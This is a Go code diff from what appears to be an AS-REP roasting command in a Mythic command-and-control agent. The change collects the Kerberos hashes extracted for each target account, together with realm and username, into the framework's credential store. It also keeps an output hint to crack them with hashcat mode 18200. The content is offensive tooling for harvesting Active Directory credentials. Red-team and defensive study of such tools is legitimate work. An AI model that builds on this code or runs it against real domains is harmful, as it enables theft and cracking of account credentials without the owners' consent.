@@ -121,6 +121,7 @@ func (c *AsrepCommand) Execute(task structs.Task) structs.CommandResult {
 	sb.WriteString(strings.Repeat("-", 60) + "\n")
 
 	roasted := 0
+	var creds []structs.MythicCredential
 	for _, target := range targets {
 		hash, etypeName, err := requestAsrep(cfg, args.Realm, args.Server, target.Username)
 		if err != nil {
@@ -131,15 +132,27 @@ func (c *AsrepCommand) Execute(task structs.Task) structs.CommandResult {
 		sb.WriteString(fmt.Sprintf("\n[+] %s (%s)\n", target.Username, etypeName))
 		sb.WriteString(hash + "\n")
 		roasted++
+
+		creds = append(creds, structs.MythicCredential{
+			CredentialType: "hash",
+			Realm:          args.Realm,
+			Account:        target.Username,
+			Credential:     hash,
+			Comment:        fmt.Sprintf("asrep-roast (%s)", etypeName),
+		})
 	}
 
 	sb.WriteString(fmt.Sprintf("\n[*] %d/%d hashes extracted (hashcat -m 18200 for RC4)\n", roasted, len(targets)))
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		result.Credentials = &creds
+	}
+	return result
 }
 
 type asrepTarget struct {
